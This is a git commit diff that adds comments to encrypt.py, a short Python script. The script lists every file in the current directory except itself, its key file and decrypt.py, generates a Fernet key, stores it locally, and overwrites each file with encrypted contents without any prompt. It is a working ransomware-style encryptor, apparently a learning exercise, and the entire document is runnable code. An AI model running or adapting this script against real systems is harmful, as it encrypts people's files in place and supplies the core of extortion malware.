59c18fdf4a21a81057a821d7d7f560a0d779ea99
Shivam <108695565+Shivam7679@users.noreply.github.com>
2023-08-27 17:09:47 +0530

    Update encrypt.py

--- encrypt.py
+++ encrypt.py
@@ -1,17 +1,17 @@
-import os
-from cryptography.fernet import Fernet
-files= []
+import os											#importing os module
+from cryptography.fernet import Fernet								#importing fernet from crytography
+files= []											#making a array to store files
 for file in os.listdir():
-	if file == "encrypt.py" or file == "actual_key.key" or file == "decrypt.py":
-		continue
-	files.append(file)
-print (files)
-key = Fernet.generate_key()
-with open("actual_key.key","wb") as actual_key:
-	actual_key.write(key)
+	if file == "encrypt.py" or file == "actual_key.key" or file == "decrypt.py":		#if these files are found
+		continue									#don't encrypt, and continue
+	files.append(file)									#Put all rest of the files in the array
+print (files)											#Print all the contents except the one we excluded
+key = Fernet.generate_key()									#key generation
+with open("actual_key.key","wb") as actual_key:							#make file where the key is generated
+	actual_key.write(key)									#write the key as the one generated now
 for file in files:
-	with open(file,"rb") as file1:
-		content= file1.read()
-	encrypt_content= Fernet(key).encrypt(content)
-	with open(file,"wb") as file1:
-		file1.write(encrypt_content)
+	with open(file,"rb") as file1:								#read the files in binary and put in file1
+		content= file1.read()								#read all the files and put in variable content
+	encrypt_content= Fernet(key).encrypt(content)						#encryption of the content with the key generated
+	with open(file,"wb") as file1:								#write the filles in binary of file1
+		file1.write(encrypt_content)							#encrypt all the content by overwriting it in binary
